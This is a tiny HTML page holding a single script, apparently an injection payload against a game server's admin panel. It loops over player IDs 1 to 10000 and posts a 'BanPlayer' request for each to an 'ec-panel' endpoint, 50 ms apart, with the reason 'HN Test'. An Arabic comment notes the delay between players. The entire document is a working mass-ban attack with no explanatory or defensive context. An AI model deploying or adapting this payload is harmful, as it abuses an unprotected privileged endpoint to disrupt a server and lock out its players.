<body>
  <script>
for (let i = 1; i <= 10000; i++) {
    setTimeout(() => {
        $.post('https://ec-panel/BanPlayer', JSON.stringify({
            id: i,
            Reason: "HN Test"
        }));
    }, i * 50); // تأخير 50ms بين كل لاعب
}
  </script>
</body>
